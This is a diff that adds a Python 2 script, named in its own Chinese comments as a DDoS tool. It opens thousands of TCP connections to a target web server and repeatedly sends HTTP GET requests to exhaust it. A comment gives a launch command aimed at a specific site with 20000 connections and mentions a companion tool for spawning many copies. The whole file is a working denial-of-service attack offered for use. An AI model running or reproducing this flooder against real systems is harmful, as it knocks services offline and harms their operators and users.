@@ -1,0 +1,189 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+import socket
+import time
+import threading
+import sys,os
+
+#启动 ./dread -read 10 -order ./ddos -host www.54yt.net:80/?s=6666 -conn 20000 -buf -sleep 0
+#停止./ddos -state stop
+
+#dread是我的另一项目可以循环创建进程
+#dread -read为循环次数 -order 后为命令参数就是需要创建进程的命令
+#---------------------------
+max_conn=0
+port=80
+host="127.0.0.1"
+page="/"
+buf=""
+sleep=0
+#---------------------------
+
+socks=[]
+
+#检测是否需要关闭
+def stop():
+ while True:
+  if os.path.exists("stop")==True:
+   os.kill(os.getpid(),9)
+  time.sleep(1)
+
+#//连接线程方法
+def conn_thread():
+	global socks
+	if max_conn == 0:
+		while True:
+			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			try:
+				s.connect((host,port))
+				s.send(buf)
+				#print "Send buf OK!,conn=%d\n"%i
+				socks.append(s)
+			except Exception,ex:
+				#print "Could not connect to server or send error:%s"%ex
+				time.sleep(sleep)
+				
+	else:
+		for i in range(0,max_conn): #range 表示从 0到max_conn
+			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			#socket.AF_INET 表示 服务器之间网络通信
+			#SOCK_STREAM 表示tcp 流式socket , for TCP
+			#详情 http://m.blog.csdn.net/article/details?id=22109925
+			try:
+				s.connect((host,port))
+				s.send(buf)
+				#print "Send buf OK!,conn=%d\n"%i
+				socks.append(s)
+			except Exception,ex:
+				#print "Could not connect to server or send error:%s"%ex
+				time.sleep(sleep)
+#end def
+
+#//发送内容包的线程
+def send_thread():
+	global socks
+	while True:
+		for s in socks:
+			try:
+				s.send(buf)
+				#print s.recv(1024)
+				#print "send OK!"
+			except Exception,ex:
+				#print "Send Exception:%s\n"%ex
+				socks.remove(s)
+				s.close()
+			time.sleep(sleep)
+#end def
+
+def buf_read(conf):
+ if os.path.exists(conf)==True:
+  f = open(conf,"r")
+  line = f.read()
+  f.close()
+ else:
+  line = ""
+  return line
+ return line
+
+def exists(conf):
+ if os.path.exists(conf)==True:
+  return True
+ else:
+  return False
+
+if __name__ == "__main__":
+ 
+ x = 0
+ order = ""
+ while x != len(sys.argv):
+  order = order + sys.argv[x] + " "
+  x = x + 1
+ print order
+ 
+ state = ""
+ if order.find("-state ") >-1:
+  state = order[order.find("-state ")+7:order.find(" ",order.find("-state ")+7)]
+
+ if os.path.exists("stop")==True:
+  os.remove("stop")
+
+ if state == "stop":
+  if os.path.exists("stop")==False:
+   f = open("stop","w")
+   f.close()
+  os.kill(os.getpid(),9)
+
+
+ if order.find("-conn ") >-1 :
+  max_conn = int(order[order.find("-conn ")+6:order.find(" ",order.find("-conn ")+6)])
+
+ if max_conn < 1:
+  max_conn = 0
+
+ if order.find("-sleep ") >-1:
+  sleep = int(order[order.find("-sleep ")+7:order.find(" ",order.find("-sleep ")+7)])
+ 
+ if sleep<1:
+  sleep = 0
+
+ if order.find("-buf ") >-1:
+  buf = buf_read(order[order.find("-buf ")+5:order.find(" ",order.find("-buf ")+5)]) 
+
+ if order.find("-host ") >-1 :
+  host = order[order.find("-host ")+6:order.find(" ",order.find("-host ")+6)]
+ 
+ if host.find("http://") >-1:
+  host = host[host.find("http://")+7:]
+ 
+ if host.find("https://") >-1:
+  host = host[host.find("https://")+8:]
+
+ if host.find("/")>-1:
+  page = "/" + host[host.find("/")+1:]
+  host = host[:host.find("/")]
+ else:
+  page = "/"
+  host = host
+
+ if host.find(":")>-1:
+  port = int(host[host.find(":")+1:])
+  host = host[:host.find(":")]
+ else:
+  port = 80
+
+ if port>0 and port<65537:
+  port = port
+ else:
+  port = 80
+
+ if buf == "":
+  buf=("GET %s HTTP/1.1\r\n"
+"Host: %s\r\n"
+"Connection: keep-alive\r\n"
+"Cache-Control: max-age=0\r\n"
+"Upgrade-Insecure-Requests: 1\r\n"
+"User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; A0001 Build/MHC19Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\r\n"
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+"Referer: http://%s/\r\n"
+"Accept-Encoding: gzip, deflate, sdch\r\n"
+"Accept-Language: zh-CN,zh;q=0.8\r\n"
+"Cookie: bdshare_firstime=1471595126237; historywidth=147; historyheight=356; is_closechuncai=close; tin_check_nonce=f3c75b7382\r\n"
+"\r\n" % (page,host,host))
+
+ print "host:" + host
+ print "port:" + str(port)
+ print "page:" + page
+ print "max_conn:" + str(max_conn)
+ print ""
+ print "buf:" + buf
+
+ #创建线程
+ stop_th=threading.Thread(target=stop,args=())
+ conn_th=threading.Thread(target=conn_thread,args=())
+ send_th=threading.Thread(target=send_thread,args=())
+
+ #启动
+ stop_th.start()
+ conn_th.start()
+ send_th.start()
